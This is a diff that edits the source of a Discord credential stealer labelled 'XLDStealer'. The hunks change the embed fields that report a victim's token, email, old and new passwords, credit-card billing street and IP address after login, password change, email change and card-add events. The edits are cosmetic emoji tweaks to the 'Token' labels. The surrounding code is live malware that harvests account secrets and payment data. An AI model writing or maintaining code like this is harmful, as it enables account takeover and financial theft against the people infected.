@@ -80,7 +80,7 @@ function FirstTime() {
                         value: `${GetBadges(n.flags)}`,
                         inline: !1,
                       },
-                      { name: "Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
                     ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
@@ -350,10 +350,10 @@ function Login(e, t, n) {
                             })()}`,
                             inline: !1,
                           },
-                          { name: "<:gmail:966790304701235230> <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
+                          { name: "<:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                           { name: "Password", value: `\`${t}\``, inline: !0 },
                           {
-                            name: "Token",
+                            name: "<:question:966655842202050570> Token",
                             value: `\`\`\`${n}\`\`\``,
                             inline: !1,
                           },
@@ -470,7 +470,7 @@ function ChangePassword(e, t, n) {
                       { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !1 },
                       { name: "Old Password", value: `\`${e}\``, inline: !0 },
                       { name: "New Password", value: `\`${t}\``, inline: !0 },
-                      { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                     ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
@@ -559,7 +559,7 @@ function ChangeEmail(e, t, n) {
                       },
                       { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                       { name: "Password", value: `\`${t}\``, inline: !0 },
-                      { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                     ],
                     author: { name: "XLDPirateStealer" },
                     footer: { text: "XLDStealer" },
@@ -626,7 +626,7 @@ function CreditCardAdded(e, t, n, a, r, o, s, i, l, d) {
                     i +
                     "```\n**Street: **```" +
                     r +
-                    "```\n**Token:**```" +
+                    "```\n**<:question:966655842202050570> Token:**```" +
                     d +
                     "```\n**IP: **```" +
                     p +
